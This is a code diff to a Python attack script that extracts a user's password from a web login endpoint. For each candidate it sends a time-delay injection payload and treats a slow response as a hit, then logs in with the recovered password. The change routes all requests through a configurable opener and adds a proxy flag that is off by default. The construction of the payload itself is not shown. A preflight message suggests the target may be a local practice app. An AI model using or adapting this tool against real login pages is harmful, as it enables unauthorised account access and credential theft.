@@ -14,7 +14,12 @@ def build_payload(username: str, password: str, delay: int) -> str:
 
 
 def measure_delay(
-    url: str, username: str, password: str, delay: int, timeout: int
+    url: str,
+    username: str,
+    password: str,
+    delay: int,
+    timeout: int,
+    opener: urllib.request.OpenerDirector,
 ) -> float:
     payload = build_payload(username, password, delay)
     data = urllib.parse.urlencode(
@@ -26,12 +31,14 @@ def measure_delay(
     ).encode("utf-8")
 
     start = time.monotonic()
-    with urllib.request.urlopen(url, data=data, timeout=timeout):
+    with opener.open(url, data=data, timeout=timeout):
         pass
     return time.monotonic() - start
 
 
-def attempt_login(url: str, username: str, password: str) -> bool:
+def attempt_login(
+    url: str, username: str, password: str, opener: urllib.request.OpenerDirector
+) -> bool:
     data = urllib.parse.urlencode(
         {
             "username": username,
@@ -40,7 +47,7 @@ def attempt_login(url: str, username: str, password: str) -> bool:
         }
     ).encode("utf-8")
 
-    with urllib.request.urlopen(url, data=data, timeout=10) as response:
+    with opener.open(url, data=data, timeout=10) as response:
         body = response.read().decode("utf-8", errors="ignore")
     return "Login successful" in body
 
@@ -65,14 +72,24 @@ def main() -> None:
         action="store_true",
         help="Run a quick connectivity check before probing.",
     )
+    parser.add_argument(
+        "--use-proxy",
+        action="store_true",
+        help="Use system proxy settings (default: disabled).",
+    )
     args = parser.parse_args()
 
     login_url = f"{args.base_url.rstrip('/')}/login"
 
+    if args.use_proxy:
+        opener = urllib.request.build_opener()
+    else:
+        opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
+
     if args.preflight:
         try:
             request = urllib.request.Request(login_url, method="GET")
-            with urllib.request.urlopen(request, timeout=5):
+            with opener.open(request, timeout=5):
                 print("Preflight OK: login page reachable.")
         except URLError as exc:
             print(f"Preflight failed: {exc}. Is the app running on {login_url}?")
@@ -85,7 +102,12 @@ def main() -> None:
                 continue
             try:
                 elapsed = measure_delay(
-                    login_url, args.username, candidate, args.delay, args.timeout
+                    login_url,
+                    args.username,
+                    candidate,
+                    args.delay,
+                    args.timeout,
+                    opener,
                 )
             except TimeoutError:
                 print(
@@ -100,7 +122,7 @@ def main() -> None:
             print(f"Tried {candidate!r}: {elapsed:.2f}s")
             if elapsed >= args.threshold:
                 print(f"Potential password found: {candidate}")
-                if attempt_login(login_url, args.username, candidate):
+                if attempt_login(login_url, args.username, candidate, opener):
                     print("Login succeeded with extracted password.")
                 else:
                     print("Login did not succeed. Check threshold/delay.")
